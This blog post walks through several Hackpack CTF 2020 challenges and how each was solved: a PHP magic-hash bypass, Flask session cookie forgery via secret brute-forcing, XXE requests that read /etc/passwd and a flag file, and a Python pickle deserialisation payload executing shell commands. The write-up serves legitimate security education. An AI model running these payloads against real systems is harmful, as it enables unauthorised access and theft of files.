
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="This weekend I participate to the Hackpack CTF with the team hackers for the jilted generation (mostly me this time). We finished 126th with 811 points. Here are some writeup about the challenges." name="description"/>
<meta content="security, CTF, web" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="Hackpack CTF 2020" property="og:title"/>
<meta content="This weekend I participate to the Hackpack CTF with the team hackers for the jilted generation (mostly me this time). We finished 126th with 811 points. Here are some writeup about the challenges." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2020/04/hackpack-ctf-2020.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2020-04-28 08:50:00+02:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="CTF" property="article:tag"/>
<meta content="web" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – Hackpack CTF 2020</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-email" href="mailto:postmater at maggick dot fr" target="_blank">
<i class="fa-brands fa-email"></i>
</a>
</li>
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="https://discord.com/users/maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
<li>
<a class="sc-reddit" href="https://www.reddit.com/user/maaggick/" target="_blank">
<i class="fa-brands fa-reddit"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="hackpack-ctf-2020">Hackpack CTF 2020</h1>
<p>
      Posted on 28 Apr 2020 in <a href="../../category/security.html">security</a>

        • 6 min read
    </p>
</header>
<div>
<p><img alt="Hackpack CTF logo" class="align-left" src="/media/2020.04/hackpack_logo.png" width="262"/></p>
<p>This weekend I participate to the Hackpack CTF with the team <code>hackers for the jilted generation</code>
(mostly me this time). We finished 126th with 811 points.
Here are some writeup about the challenges.</p>
<h1>Web</h1>
<h2>Treasure Map</h2>
<blockquote>
<p>Hmm, do pirates really think they can hide a treasure without us knowing? Find the treasure and prove they are wrong. Check here: treasure-map.cha.hackpack.club</p>
</blockquote>
<p>The webpage contain the following:</p>
<div class="highlight"><pre><span></span><code>Treasure of the Pirates!
It should in some of this (or hidden) island!

Hint: you need a map of this place to find it!

Island #0
Island #1
&lt;SNIP&gt;
Island #9998
Island #9999
</code></pre></div>
<p>We are looking for the map. We check <code>robots.txt</code>: it contains: <code>Sitemap: /treasuremap.xml</code></p>
<p>The file <code>/treasuremap.xml</code> contain the location of the "treasure":</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">urlset</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">url</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">loc</span><span class="p">&gt;</span>7BmqJfhWhEa30NeVj7j2.html<span class="p">&lt;/</span><span class="nt">loc</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">lastmod</span><span class="p">&gt;</span>2005-01-01<span class="p">&lt;/</span><span class="nt">lastmod</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">changefreq</span><span class="p">&gt;</span>monthly<span class="p">&lt;/</span><span class="nt">changefreq</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">priority</span><span class="p">&gt;</span>0.8<span class="p">&lt;/</span><span class="nt">priority</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">url</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">urlset</span><span class="p">&gt;</span>
</code></pre></div>
<p>And the "treasure" contain the flag: <code>flag{tr3asur3_hunt1ng_fUn}</code></p>
<h2>Super Secret Flag Vault</h2>
<blockquote>
<p>See if you can get into the super secret flag vault! I have used the latest and greatest techniques with php to make sure you cant get past my vault.</p>
</blockquote>
<p>The <code>index.php</code> file is available:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
      <span class="c1">// this is how I store hashes right?</span>
      <span class="nv">$hash</span> <span class="o">=</span> <span class="s2">"0e770334890835629000008642775106"</span><span class="p">;</span>
      <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"combination"</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"combination"</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">){</span>
          <span class="c1">//Isn't it great that == works in every language?</span>
          <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"debug"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)){</span>
              <span class="k">echo</span> <span class="s2">"&lt;br&gt; "</span><span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"combination"</span><span class="p">]);</span>
          <span class="p">}</span>
          <span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"combination"</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$hash</span><span class="p">){</span>
              <span class="k">echo</span> <span class="s2">"&lt;br&gt; The Flag is flag{...}&lt;br&gt;"</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span><span class="p">{</span>
              <span class="k">echo</span> <span class="s2">"&lt;br&gt;Wrong!&lt;br&gt;"</span><span class="p">;</span>
          <span class="p">}</span>

      <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div>
<p>The value of hash is just a number using scientific notation. This is a <a href="https://www.php.net/manual/en/language.operators.comparison.php">php loose
comparison</a>.
Using a input that will also be considered as a number will set the condition to true.
We use <code>240610708</code>, which md5 hash is <code>0e462097431906509019562988736854</code>, as a
password and we got the flag.</p>
<blockquote>
<p>The Flag is flag{!5_Ph9_5TronGly_7yPed?}</p>
</blockquote>
<h2>Paster</h2>
<blockquote>
<p>Come and BETA Test our new social networking site. Its like twitter but shorter
Go checkout Paster now</p>
</blockquote>
<p>The site looks like the following:</p>
<p><img alt="Paster" class="image-process-article-image" src="/media/2020.04/derivatives/article-image/hackpack_paster.png"/></p>
<p>When looking at the downloaded content we fount that the file
<code>frames/game-frame.js</code> is downloaded. It contains 248 311 characters as the
following:</p>
<div class="highlight"><pre><span></span><code>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+
(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+
[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])
[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+
(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]
&lt;SNIP&gt;
</code></pre></div>
<p>This is <a href="http://www.jsfuck.com/">JSfuck</a>. We use an
<a href="https://enkhee-osiris.github.io/Decoder-JSFuck/">online decoder</a> to decode it.
The output is some clear JavaScript.</p>
<div class="highlight"><pre><span></span><code><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">toString</span><span class="p">(),</span><span class="s2">"*"</span><span class="p">);</span><span class="kd">var</span><span class="w"> </span><span class="nx">originalAlert</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span>
<span class="nx">alert</span><span class="p">;</span><span class="nb">window</span><span class="p">.</span><span class="nx">alert</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">){</span><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s2">"success"</span><span class="p">,</span><span class="s2">"*"</span><span class="p">),</span>
<span class="nx">flag</span><span class="o">=</span><span class="nx">atob</span><span class="p">(</span><span class="s2">"ZmxhZ3t4NTVfaTVOdF83aEE3X2JBRF9SMUdoNz99"</span><span class="p">),</span><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span>
<span class="p">{</span><span class="nx">originalAlert</span><span class="p">(</span><span class="s2">"Congratulations, you executed an alert:\n\n"</span><span class="o">+</span><span class="nx">t</span><span class="o">+</span><span class="s2">"\n\nhere is the flag: "</span><span class="o">+</span><span class="nx">flag</span><span class="p">)},</span><span class="mf">50</span><span class="p">)};</span>
</code></pre></div>
<p>We where probably supposed to do some XSS to get the flag but we got it either
way.</p>
<div class="highlight"><pre><span></span><code>$ echo -ne 'ZmxhZ3t4NTVfaTVOdF83aEE3X2JBRF9SMUdoNz99' | base64 -d
flag{x55_i5Nt_7hA7_bAD_R1Gh7?}[
</code></pre></div>
<h2>Cookie Forge</h2>
<blockquote>
<p>Help a new local cookie bakery startup shake down their new online ordering and loyalty rewards portal at cookie-forge.cha.hackpack.club!</p>
<p>I wonder if they will sell you a Flask of milk to go with your cookies...</p>
</blockquote>
<p>The website is using flask. A page is reserved for premium member.</p>
<p>We know that <a href="https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce">flask cookie have some issues</a>.</p>
<p>We place an order. Login as <code>toto:toto</code> get the cookie and pass it to
<code>flask-unsign</code>. The tool can decode it as the secret is only use to sign the
cookie.</p>
<div class="highlight"><pre><span></span><code>$flask-unsign -d -c 'eyJmbGFnc2hpcCI6ZmFsc2UsInVzZXJuYW1lIjoidG90byJ9.Xp2SeA.1l6nDFaIsDZ8bCXcxdtORRVIBK0'
{'flagship': False, 'username': 'toto'}
</code></pre></div>
<p>We need to get the secret to forge our own cookie</p>
<div class="highlight"><pre><span></span><code>$ flask-unsign --server https://cookie-forge.cha.hackpack.club/orders --unsign
[*] Server returned HTTP 302 (Found)
[+] Successfully obtained session cookie: eyJfZmxhc2hlcyI6W3siIHQiOlsid2FybmluZyIsIllvdSBtdXN0IGxvZyBpbiBmaXJzdCEiXX1dfQ.Xp2TwA.IiGnkGfSx0j-O_vLTjmUyU95zLQ
[*] Session decodes to: {'_flashes': [('warning', 'You must log in first!')]}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 39090 attempts
'password1'
</code></pre></div>
<p>We modify the <code>flagship</code> value and sign our cookie with the secret <code>password1</code></p>
<div class="highlight"><pre><span></span><code>$ flask-unsign --sign --secret password1 --cookie "{'flagship': True, 'username': 'toto'}"
eyJmbGFnc2hpcCI6dHJ1ZSwidXNlcm5hbWUiOiJ0b3RvIn0.Xp2TRQ.XlXCKJYANDb9ghp5ms_fKQhTkVY
</code></pre></div>
<p>Using Burp repeater we modify our cookie to get the flag</p>
<div class="highlight"><pre><span></span><code>GET /flag HTTP/1.1
Host: cookie-forge.cha.hackpack.club
Cookie: session=eyJmbGFnc2hpcCI6dHJ1ZSwidXNlcm5hbWUiOiJ0b3RvIn0.Xp2TRQ.XlXCKJYANDb9ghp5ms_fKQhTkVY
Upgrade-Insecure-Requests: 1


HTTP/1.1 200 OK
Content-Length: 2617
Content-Type: text/html; charset=utf-8
Date: Mon, 20 Apr 2020 12:26:22 GMT
Server: meinheld/1.0.1
Vary: Cookie
&lt;SNIP&gt;
&lt;p&gt;You are a &lt;em&gt;special&lt;/em&gt; customer!
    To come back for more, sugar-coma after sugar-coma, in the face of mounting pressure from your doctors,
    your family, and your own common sense&amp;hellip;
    &lt;strong&gt;That's&lt;/strong&gt; dedication.
&lt;/p&gt;
&lt;p&gt;Just to show our appreciation for your morbid commitment to our life-altering products, we're giving you this flag:&lt;/p&gt;
&lt;code&gt;flag{0h_my_@ch1ng_p@ncre@5_th33$3_@r3_d3l1c10$0}&lt;/code&gt;
</code></pre></div>
<h2>Custom UI</h2>
<blockquote>
<p>How often do you visit the website just to bounce back because of bad design? Now we developed a new feature, which gives you the ability to change the design! Check out a new feature: custom-ui.cha.hackpack.club</p>
</blockquote>
<p><img alt="page" class="image-process-article-image" src="/media/2020.04/derivatives/article-image/hackpack_custom_ui.png"/></p>
<p>We can input data to change the button color and add text to it. If we input
<code>&lt;script&gt;</code> we trigger an error:</p>
<div class="highlight"><pre><span></span><code>Warning: DOMDocument::loadXML(): Opening and ending tag mismatch: script line 1 and value in Entity, line: 1 in /var/www/html/index.php on line 12
Warning: DOMDocument::loadXML(): Opening and ending tag mismatch: value line 1 and button in Entity, line: 1 in /var/www/html/index.php on line 12
Warning: DOMDocument::loadXML(): Premature end of data in tag button line 1 in Entity, line: 1 in /var/www/html/index.php on line 12
Warning: simplexml_import_dom(): Invalid Nodetype to import in /var/www/html/index.php on line 13
</code></pre></div>
<p>Therefore we will go for a <a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection">XML External Entity (XXE) Injection</a>.</p>
<div class="highlight"><pre><span></span><code>POST /? HTTP/1.1
Host: custom-ui.cha.hackpack.club
Content-Type: application/x-www-form-urlencoded
Cookie: debug=false
Content-Length: 198

xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxez1rnx%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxez1rnx%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e

&lt;SNIP&gt;
&lt;body&gt;
  &lt;div style="max-width:600px; margin:auto"&gt;
    &lt;h1&gt;Your custom button!&lt;/h1&gt;
          &lt;button style="background-color: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
; padding: 15px 32px;"&gt;
&lt;SNIP&gt;
</code></pre></div>
<p>We change the <code>debug</code> cookie to <code>true</code> and we get a comment at the bottom of the
page: <code>&lt;!-- TODO: Delete flag.txt from /etc/ --&gt;&lt;/body&gt;</code></p>
<div class="highlight"><pre><span></span><code>POST /? HTTP/1.1
Host: custom-ui.cha.hackpack.club
Content-Type: application/x-www-form-urlencoded
Cookie: debug=false
Content-Length: 200

xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxez1rnx%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fflag.txt%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxez1rnx%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e

&lt;SNIP&gt;
&lt;button style="background-color: flag{d1d_y0u_kn0w_th@t_xml_can_run_code?}; padding: 15px 32px;"&gt;
&lt;SNIP&gt;
</code></pre></div>
<h1>Misc</h1>
<h2>SSME</h2>
<blockquote>
<p>Welcome to our Super Secure Message Encrypter (SSME - copyright pending)
nc cha.hackpack.club 41704</p>
</blockquote>
<p>We connect to the service. We encrypt the string <code>qq</code> and decode it.</p>
<div class="highlight"><pre><span></span><code>$ nc cha.hackpack.club 41704
[*] Welcome to our Super Secure Message Encrypter (SSME - copyright pending)
[*] We use patented technology that only we have access to in order to safely encrypt your data
[*] Please use this tool to encrypt/decrypt messages

[*] Please select from the following options
1.) Encrypt a message
2.) Read a message
3.) Quit
&gt; 1
What would you like to encrypt? qq
[+] Message encrypted: gANYAgAAAHFxcQAu


[*] Please select from the following options
1.) Encrypt a message
2.) Read a message
3.) Quit
&gt; 2
Please enter the encrypted string here: gANYAgAAAHFxcQAu
[+] Message decrypted: qq
</code></pre></div>
<p>Then we send a malformed input for the decryption, that generate an error:</p>
<div class="highlight"><pre><span></span><code>[*] Please select from the following options
1.) Encrypt a message
2.) Read a message
3.) Quit
&gt; 2
Please enter the encrypted string here: gANYAgAAAHFxc
Traceback (most recent call last):
  File "/usr/lib/python3.6/encodings/base64_codec.py", line 19, in base64_decode
    return (base64.decodebytes(input), len(input))
  Fle "/usr/lib/python3.6/base64.py", line 546, in decodebytes
    return binascii.a2b_base64(s)
binascii.Error: Incorrect padding

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/challenger/app.py", line 46, in &lt;module&gt;
    main()
  File "/home/challenger/app.py", line 37, in main
    dec = decrypt(to_dec)
  File "/home/challenger/app.py", line 24, in decrypt
    return pickle.loads(codecs.decode(to_dec.encode(), "base64"))
binascii.Error: decoding with 'base64' codec failed (Error: Incorrect padding)i
</code></pre></div>
<p>The error disclose the use of the python pickle which are know to be vulnerable
an allowing command execution.</p>
<p>We create a pickle to execute OS commands on the system:</p>
<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; import pickle
&gt;&gt;&gt; import subprocess
&gt;&gt;&gt; import base64
&gt;&gt;&gt;
&gt;&gt;&gt; class RunBinSh(object):
...   def __reduce__(self):
...     return (subprocess.Popen, (('ls',),))
...
&gt;&gt;&gt; print base64.b64encode(cPickle.dumps(RunBinSh()))
b'gASVIwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwCbHOUhZSFlFKULg=='
</code></pre></div>
<p>We decode the generate pickle</p>
<div class="highlight"><pre><span></span><code>$ nc cha.hackpack.club 41704
[*] Welcome to our Super Secure Message Encrypter (SSME - copyright pending)
[*] We use patented technology that only we have access to in order to safely encrypt your data
[*] Please use this tool to encrypt/decrypt messages

[*] Please select from the following options
1.) Encrypt a message
2.) Read a message
3.) Quit
&gt; 2
Please enter the encrypted string here: gASVIwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwCbHOUhZSFlFKULg==
[+] Message decrypted: &lt;subprocess.Popen object at 0x7f2b6d9a9550&gt;

[*] Please select from the following options
1.) Encrypt a message
2.) Read a message
3.) Quit
&gt; app.py
flag.txt
</code></pre></div>
<p>We generate a new pickle to read the flag:</p>
<div class="highlight"><pre><span></span><code>&gt;&gt;&gt; class RunBinSh(object):
...   def __reduce__(self):
...     return (subprocess.Popen, (('cat', 'flag.txt',),))
...
&gt;&gt;&gt; print(base64.b64encode(pickle.dumps(RunBinSh())))
b'gASVLwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwIZmxhZy50eHSUhpSFlFKULg=='

Please enter the encrypted string here: gASVLwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwIZmxhZy50eHSUhpSFlFKULg==
[+] Message decrypted: &lt;subprocess.Popen object at 0x7f2b6d9a4438&gt;

[*] Please select from the following options
1.) Encrypt a message
2.) Read a message
3.) Quit
&gt; flag{n3v3R_u$e_p!ckLe_w_uNtru$t3d_d4t4}
</code></pre></div>
<h2>Hiding in Plaintext</h2>
<blockquote>
<p>Connect to CryptoKid's Mall of MirrXors at cha.hackpack.club:41715 to try your hand at guessing the flag!
(Mr. Vernam says CryptoKid stole his ideas, but Miss Venona says he stole them...badly...)</p>
</blockquote>
<p>We understand that the service is doing XOR encryption. We connect to it and
thee that there is the encrypted flag and that we can encrypt anything we want.</p>
<div class="highlight"><pre><span></span><code>$ nc cha.hackpack.club 41715
Welcome to CryptoKid's Hall of MirrXors!
Here is BASE64(ENC(FLAG, SESSION_KEY)) =&gt; bwHJ1+IUTxTLWyYalXkyC3m5B4lRj+4BerJ3S/WxWj4kKbbqdx/M6nh8bCE+C0ZjJJc9hKHMPSTwUQ==
Wanna guess what FLAG is? qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
Here is BASE64(ENC(GUESS, SESSION_KEY)) =&gt; eBzZwegLDhGXXj9YyWVzCXzlR5VQjKwDePJwCamwRw9kNrOofhqQ7Xxhc30tD0M/Io582LP9PmbyXXgc2cHoCw4Rl14/WMllcwl85UeVUIysA3jy
How'd you do??
</code></pre></div>
<p>We have a known clear text attack on a XOR encryption. We just need to XOR the
encoded flag to our encrypted plain text <code>qqqqqq…</code> then XOR it again with our
clear plain text. Here is the
<a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'Base64','string':'eBzZwegLDhGXXj9YyWVzCXzlR5VQjKwDePJwCamwRw9kNrOofhqQ7Xxhc30tD0M/Io582LP9PmbyXXgc2cHoCw4Rl14/WMllcwl85UeVUIysA3jy'%7D,'Standard',false)XOR(%7B'option':'Latin1','string':'qqqqqqqqqqqqq'%7D,'Standard',false)&amp;input=YndISjErSVVUeFRMV3lZYWxYa3lDM201QjRsUmorNEJlckozUy9XeFdqNGtLYmJxZHgvTTZuaDhiQ0UrQzBaakpKYzloS0hNUFNUd1VRPT0">
Cyber Chef recipe </a> that give us the flag: <code>flag{n0t-th3-m0st-1mpr3ss1v3-pl@1nt3xt-vuln-but-wh0-c@r3s}</code>.</p>
<h1>Wrapping up</h1>
<p>This was a nice CTF as the challenges were quite doable.</p>
<p><img alt="score board" class="image-process-article-image" src="/media/2020.04/derivatives/article-image/hackpack_scoreboard.png"/></p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/ctf.html">CTF</a>
<a href="../../tag/web.html">web</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2020/04/htb-mango.html" title="HTB: Mango">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2020/05/htb-openadmin.html" title="HTB: OpenAdmin">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2024  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>